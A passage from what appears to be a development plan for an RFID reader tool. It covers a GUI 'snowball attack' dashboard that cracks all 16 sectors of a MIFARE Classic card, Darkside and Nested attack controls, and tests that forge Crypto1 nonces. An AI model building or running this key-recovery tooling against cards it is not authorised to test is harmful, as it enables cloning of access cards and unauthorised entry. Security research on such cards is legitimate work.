Run: `cd "Projects/RFID Card Reader/gui" && python -m pytest tests/test_snowball.py -v`
Expected: ALL tests pass

### Step 3: Fix any failures, then commit

```bash
git add gui/tests/test_snowball.py
git commit -m "test(gui): comprehensive snowball orchestrator state machine tests"
```

---

## Task 5: Snowball Orchestrator — Recovery Integration Test

**Files:**
- Modify: `gui/tests/test_snowball.py` (add end-to-end test with simulated key recovery)

**Context:** Test the full cycle: calibration nonce -> distance computation -> collection nonce -> key recovery -> snowball to next sector. Uses the same `_make_calibration_nonce` helper from `test_attack.py`.

### Step 1: Write the integration test

Add to `gui/tests/test_snowball.py`:

```python
def _make_calibration_nonce(uid_wire, nt_known_wire, known_key, dist):
    """Generate a wire-order encrypted nonce for calibration testing."""
    from crypto1 import Crypto1, prng_successor
    from key_recovery import _bswap32
    uid_le = _bswap32(uid_wire)
    nt_known_le = _bswap32(nt_known_wire)
    nt_pred = prng_successor(nt_known_le, dist)
    c = Crypto1(known_key)
    ks32 = c.crypto1_word(uid_le ^ nt_pred, 0)
    nt_enc_le = nt_pred ^ ks32
    return _bswap32(nt_enc_le)


def test_full_calibration_flow():
    """Full calibration: auth -> probe -> distance computed."""
    serial = FakeSerial()
    orch = SnowballOrchestrator(serial, uid=0xE413B3DA)
    known_key = bytes.fromhex("FFFFFFFFFFFF")
    # Set up two known sectors
    orch.known_keys = {
        0: (known_key, "B"),
        1: (known_key, "B"),
    }
    orch.target_queue = list(range(2, 16))
    orch.stats.start_time = 1.0
    orch.state = "starting"

    orch.feed({"type": "OK", "message": "CONV_START"})
    assert orch.state == "calibrating"

    # Simulate 3 calibration nonce pairs
    dist = 160
    for i in range(3):
        nt_known = 0x01020304 + i
        nt_enc = _make_calibration_nonce(0xE413B3DA, nt_known, known_key, dist)
        # Feed NA:OK then NP:NT
        orch.feed({"type": "NA", "subtype": "OK",
                   "uid": "E413B3DA", "nt": f"{nt_known:08X}"})
        orch.feed({"type": "NP", "subtype": "NT",
                   "nt_known": f"{nt_known:08X}",
                   "nt_target": f"{nt_enc:08X}"})

    # After 3 nonce pairs, should have calibrated and moved to collecting
    assert orch.state == "collecting"
    assert orch.calibrated_distance == dist
```

### Step 2: Run tests

Run: `cd "Projects/RFID Card Reader/gui" && python -m pytest tests/test_snowball.py::test_full_calibration_flow -v`
Expected: PASS

### Step 3: Commit

```bash
git add gui/tests/test_snowball.py
git commit -m "test(gui): snowball calibration integration test"
```

---

## Task 6: GUI — Sector Map Dashboard Widget

**Files:**
- Modify: `gui/app.py` (replace attacks page with snowball dashboard, add sector map widget)

**Context:** The existing attacks page has Darkside button, nested sector dropdown + button, and an abort button. We replace this with a snowball dashboard that has: a 16-sector grid showing status, a "Start Snowball Attack" button, live stats, and a scrolling event log. The old Darkside/Nested buttons move to a "Manual Attacks" section below.

### Step 1: Add the sector map widget and rewrite `_build_attacks_page()`

Replace the existing `_build_attacks_page()` method in `gui/app.py` with:

```python
    def _build_attacks_page(self):
        p = self.pages["attacks"]
        p.grid_columnconfigure(0, weight=1)
        p.grid_rowconfigure(4, weight=1)

        # ── Snowball Attack Section ──
        snow_frame = ctk.CTkFrame(p, fg_color="#1a1a2e", border_width=2,
                                   border_color="#0d9488", corner_radius=10)
        snow_frame.grid(row=0, column=0, sticky="ew", pady=(0, 10), padx=2)
        snow_frame.grid_columnconfigure(0, weight=1)

        ctk.CTkLabel(
            snow_frame, text="Snowball Attack",
            font=ctk.CTkFont(size=18, weight="bold"),
        ).grid(row=0, column=0, pady=(10, 5), padx=10, sticky="w")

        ctk.CTkLabel(
            snow_frame,
            text="Autonomously crack all sectors using cascading key recovery",
            text_color="gray60",
        ).grid(row=1, column=0, padx=10, sticky="w")

        # Sector Map Grid (4 cols x 4 rows = 16 sectors)
        self._sector_frames = {}
        self._sector_labels = {}
        self._sector_key_labels = {}
        map_frame = ctk.CTkFrame(snow_frame, fg_color="transparent")
        map_frame.grid(row=2, column=0, padx=10, pady=10, sticky="ew")
        for col in range(4):
            map_frame.grid_columnconfigure(col, weight=1)

        for sector in range(16):
            row_idx = sector // 4
            col_idx = sector % 4
            sf = ctk.CTkFrame(map_frame, width=100, height=60,
                              fg_color="#2b2b2b", corner_radius=8,
                              border_width=1, border_color="#444444")
            sf.grid(row=row_idx, column=col_idx, padx=4, pady=4, sticky="nsew")
            sf.grid_propagate(False)

            lbl = ctk.CTkLabel(sf, text=f"S{sector:02d}",
                               font=ctk.CTkFont(size=13, weight="bold"))
            lbl.place(relx=0.5, rely=0.3, anchor="center")

            key_lbl = ctk.CTkLabel(sf, text="??????",
                                   font=ctk.CTkFont(family="Consolas", size=9),
                                   text_color="gray50")
            key_lbl.place(relx=0.5, rely=0.7, anchor="center")

            self._sector_frames[sector] = sf
            self._sector_labels[sector] = lbl
            self._sector_key_labels[sector] = key_lbl

        # Stats row
        stats_frame = ctk.CTkFrame(snow_frame, fg_color="transparent")
        stats_frame.grid(row=3, column=0, padx=10, pady=(0, 5), sticky="ew")

        self._snow_status_label = ctk.CTkLabel(
            stats_frame, text="Ready", font=ctk.CTkFont(size=12))
        self._snow_status_label.pack(side="left", padx=10)

        self._snow_progress_label = ctk.CTkLabel(
            stats_frame, text="0/16 sectors",
            font=ctk.CTkFont(size=12, weight="bold"))
        self._snow_progress_label.pack(side="right", padx=10)

        self._snow_time_label = ctk.CTkLabel(
            stats_frame, text="", font=ctk.CTkFont(size=11),
            text_color="gray60")
        self._snow_time_label.pack(side="right", padx=10)

        # Buttons row
        btn_frame = ctk.CTkFrame(snow_frame, fg_color="transparent")
        btn_frame.grid(row=4, column=0, padx=10, pady=(0, 10), sticky="ew")

        self.snowball_btn = ctk.CTkButton(
            btn_frame, text="Start Snowball Attack",
            fg_color="#0d9488", hover_color="#0f766e",
            width=220, height=45,
            font=ctk.CTkFont(size=14, weight="bold"),
            command=self._start_snowball,
        )
        self.snowball_btn.pack(side="left", padx=5)

        self.snow_stop_btn = ctk.CTkButton(
            btn_frame, text="Abort", fg_color="#da3633",
            hover_color="#b62324", width=100, height=45,
            command=self._stop_snowball,
        )
        self.snow_stop_btn.pack(side="left", padx=5)

        # ── Manual Attacks Section (collapsed) ──
        manual_frame = ctk.CTkFrame(p, fg_color="#2b2b2b")
        manual_frame.grid(row=1, column=0, sticky="ew", pady=10, padx=2)

        ctk.CTkLabel(
            manual_frame, text="Manual Attacks",
            font=ctk.CTkFont(size=14, weight="bold"),
        ).pack(pady=(10, 5))

        man_btns = ctk.CTkFrame(manual_frame, fg_color="transparent")
        man_btns.pack(pady=(0, 10))

        self.crack_btn = ctk.CTkButton(
            man_btns, text="Darkside Attack", fg_color="#8b5cf6",
            hover_color="#7c3aed", width=160, height=35,
            command=self._start_crack,
        )
        self.crack_btn.pack(side="left", padx=5)

        nested_row = ctk.CTkFrame(man_btns, fg_color="transparent")
        nested_row.pack(side="left", padx=10)
        ctk.CTkLabel(nested_row, text="Sector:").pack(side="left", padx=(0, 4))
        self._nested_sector_var = ctk.StringVar(value="5")
        self._nested_sector_menu = ctk.CTkOptionMenu(
            nested_row, variable=self._nested_sector_var,
            values=[str(s) for s in range(5, 16)],
            width=60, height=30,
        )
        self._nested_sector_menu.pack(side="left", padx=(0, 4))
        self.nested_btn = ctk.CTkButton(
            nested_row, text="Nested Attack", fg_color="#0d9488",
            hover_color="#0f766e", width=140, height=35,
            command=self._start_nested,
        )
        self.nested_btn.pack(side="left")

        self.attack_label = ctk.CTkLabel(p, text="", font=ctk.CTkFont(size=14))
        self.attack_label.grid(row=2, column=0, pady=5)

        # ── Attack Event Log ──
        ctk.CTkLabel(p, text="Attack Log",
                     font=ctk.CTkFont(size=12, weight="bold")).grid(
            row=3, column=0, sticky="w", pady=(5, 2))
        self.attack_log = ctk.CTkTextbox(
            p, font=ctk.CTkFont(family="Consolas", size=11), height=150)
        self.attack_log.grid(row=4, column=0, sticky="nsew")
        self.attack_log.configure(state="disabled")
```

### Step 2: Add the `_start_snowball()` and `_stop_snowball()` methods

Add to `app.py` after `_start_nested()`:

```python
    def _start_snowball(self):
        if not self.serial.is_connected:
            self._log("Snowball failed: not connected", "ERROR")
            return
        if not self._last_tag_uid:
            self._log("Snowball failed: scan a tag first", "ERROR")
            return
        if not self._guard.start("snowball"):
            self._log("Operation in progress, please wait", "WARN")
            return

        from snowball import SnowballOrchestrator
        uid_int = int(self._last_tag_uid, 16)
        self.snowball = SnowballOrchestrator(self.serial, uid=uid_int)
        self.snowball.start(
            seed_sector=0,
            seed_key=bytes.fromhex("FFFFFFFFFFFF"),
            seed_key_type="B",
        )
        self._log(f"Snowball attack started (UID={self._last_tag_uid})")
        self._snow_status_label.configure(text="Starting...")
        # Reset sector map
        for s in range(16):
            self._sector_frames[s].configure(border_color="#444444",
                                              fg_color="#2b2b2b")
            self._sector_key_labels[s].configure(text="??????",
                                                  text_color="gray50")
        # Mark sector 0 as known
        self._sector_frames[0].configure(fg_color="#0d3320",
                                          border_color="#2ea043")
        self._sector_key_labels[0].configure(text="FFFFFFFFFFFF",
                                              text_color="#2ea043")

    def _stop_snowball(self):
        if hasattr(self, 'snowball') and self.snowball.state not in ("idle", "done"):
            self.snowball.stop()
            self._guard.finish()
            self._snow_status_label.configure(text="Stopped")
            self._log("Snowball attack stopped by user", "WARN")
```

### Step 3: Add snowball event handling in `_poll_serial()`

In the `_poll_serial()` method, add handling for snowball events. Inside the `while not self.serial.queue.empty()` loop, add a block that routes `NA`, `NP`, `NH`, `NX` messages to the snowball orchestrator (similar to how `DARK` and `NESTED` are routed to `self.attack`).

Add this after the existing `if msg.get("type") in ("DARK", "NESTED"):` block:

```python
                if msg.get("type") in ("NA", "NP", "NH", "NX", "OK"):
                    if hasattr(self, 'snowball') and self.snowball.state not in ("idle", "done"):
                        self.snowball.feed(msg)
                        self._process_snowball_events()
```

### Step 4: Add `_process_snowball_events()` method

```python
    def _process_snowball_events(self):
        """Process events from the snowball orchestrator and update GUI."""
        while not self.snowball.result_queue.empty():
            result = self.snowball.result_queue.get_nowait()
            event = result.get("event", "")

            if event == "snowball_started":
                n = result["total_unknown"]
                self._snow_progress_label.configure(text=f"0/{n + 1} sectors")
                self._attack_log(f"Snowball started: {n} sectors to crack")

            elif event == "sector_calibrating":
                src, tgt = result["source"], result["target"]
                self._snow_status_label.configure(
                    text=f"Calibrating (S{src:02d} -> S{tgt:02d})")
                self._sector_frames[tgt].configure(
                    border_color="#d29922", fg_color="#2b2200")
                self._attack_log(f"Calibrating: S{src:02d} -> S{tgt:02d}")

            elif event == "sector_calibrated":
                d = result["distance"]
                self._attack_log(f"PRNG distance: {d} ({result['samples']} samples)")

            elif event == "sector_collecting":
                tgt = result["target"]
                n = result["nonce_count"]
                self._snow_status_label.configure(
                    text=f"Collecting S{tgt:02d}: {n} nonces")
                self._sector_frames[tgt].configure(
                    border_color="#d29922", fg_color="#2b2200")

            elif event == "sector_recovering":
                tgt = result["target"]
                self._snow_status_label.configure(
                    text=f"Recovering S{tgt:02d}...")
                self._attack_log(
                    f"Recovering S{tgt:02d} ({result['nonce_count']} nonces)")

            elif event == "sector_cracked":
                s = result["sector"]
                key = result["key"]
                t = result["time_taken"]
                cracked = self.snowball.stats.sectors_cracked
                total = cracked + len(self.snowball.target_queue) + self.snowball.stats.sectors_failed
                self._sector_frames[s].configure(
                    fg_color="#0d3320", border_color="#2ea043")
                self._sector_key_labels[s].configure(
                    text=key, text_color="#2ea043")
                self._snow_progress_label.configure(
                    text=f"{cracked + 1}/16 sectors")
                self._snow_status_label.configure(text=f"Cracked S{s:02d}!")
                self._attack_log(
                    f"CRACKED S{s:02d}: {key} ({t:.1f}s)")

            elif event == "sector_failed":
                s = result["sector"]
                reason = result["reason"]
                self._sector_frames[s].configure(
                    fg_color="#3b1111", border_color="#da3633")
                self._sector_key_labels[s].configure(
                    text="FAILED", text_color="#da3633")
                self._attack_log(f"FAILED S{s:02d}: {reason}")

            elif event == "snowball_complete":
                self._guard.finish()
                n = result["total_cracked"]
                t = result["total_time"]
                self._snow_status_label.configure(text="Complete!")
                self._snow_progress_label.configure(
                    text=f"{n + 1}/16 sectors")
                elapsed = f"{t:.0f}s" if t < 60 else f"{t/60:.1f}m"
                self._snow_time_label.configure(text=f"Total: {elapsed}")
                self._attack_log(
                    f"COMPLETE: {n} sectors cracked in {elapsed}")
                self._log(f"Snowball complete: {n} sectors, {elapsed}")

            elif event == "snowball_stopped":
                self._guard.finish()
                self._attack_log("Snowball stopped by user")

    def _attack_log(self, text):
        """Write to the attack event log."""
        ts = datetime.now().strftime("%H:%M:%S")
        self.attack_log.configure(state="normal")
        self.attack_log.insert("end", f"[{ts}] {text}\n")
        self.attack_log.see("end")
        self.attack_log.configure(state="disabled")
```

### Step 5: Update timeout for snowball operations

In `_poll_serial()`, update the timeout check to include snowball:

```python
        attack_ops = ("cracking", "nested_attack", "snowball")
```

### Step 6: Run existing tests to verify nothing broke

Run: `cd "Projects/RFID Card Reader/gui" && python -m pytest tests/ -v`
Expected: All tests pass (existing + new)

### Step 7: Commit

```bash
git add gui/app.py
git commit -m "feat(gui): snowball dashboard with sector map and live stats"
```

---

## Task 7: Integration — Wire Everything Together and Run All Tests

**Files:**
- Modify: `gui/app.py` (ensure `OK:CONV_START` routes to snowball)
- All test files

**Context:** Make sure the `OK:CONV_START` message from the `C` command correctly starts the snowball flow, and that all message routing works end-to-end.

### Step 1: Verify message routing

The `OK:CONV_START` comes through as `{"type": "OK", "message": "CONV_START"}`. The existing `_poll_serial` code handles `msg["type"] == "OK"` in a separate branch. We need to make sure snowball gets this message too.

Check that the routing in `_poll_serial()` for `OK` type messages includes the snowball feed. The block added in Task 6 Step 3 checks `msg.get("type") in ("NA", "NP", "NH", "NX", "OK")` which includes `OK`, so `CONV_START` will be routed. Verify this works.

### Step 2: Run the full test suite

Run: `cd "Projects/RFID Card Reader/gui" && python -m pytest tests/ -v --tb=short`
Expected: ALL tests pass

### Step 3: Build firmware

Run: `cd "Projects/RFID Card Reader" && pio run -e uno`
Expected: Build succeeds

### Step 4: Commit any final fixes

```bash
git add -A
git commit -m "chore: integration fixes and full test suite passing"
```

---

## Task 8: Verification and Cleanup

**Files:** All

### Step 1: Run full test suite one final time

Run: `cd "Projects/RFID Card Reader/gui" && python -m pytest tests/ -v`
Expected: ALL pass

### Step 2: Build firmware one final time

Run: `cd "Projects/RFID Card Reader" && pio run -e uno`
Expected: Clean build

### Step 3: Verify flash size

Run: `cd "Projects/RFID Card Reader" && pio run -e uno -t size`
Expected: Flash < 32KB (ATmega328P limit), RAM < 2KB

### Step 4: Final commit if needed, then report

Report results to user. Ready for hardware testing.

---

## Summary of Deliverables

| Task | Component | Files | Tests |
|------|-----------|-------|-------|
| 1 | Firmware conversational protocol | `src/main.c` | Hardware test |
| 2 | Serial parser for new responses | `gui/serial_handler.py` | `test_serial_handler.py` |
| 3 | Snowball orchestrator core | `gui/snowball.py` | `test_snowball.py` |
| 4 | Orchestrator state machine tests | - | `test_snowball.py` |
| 5 | Recovery integration test | - | `test_snowball.py` |
| 6 | GUI sector map dashboard | `gui/app.py` | Visual test |
| 7 | Integration wiring | `gui/app.py` | Full suite |
| 8 | Verification | - | Full suite + build |
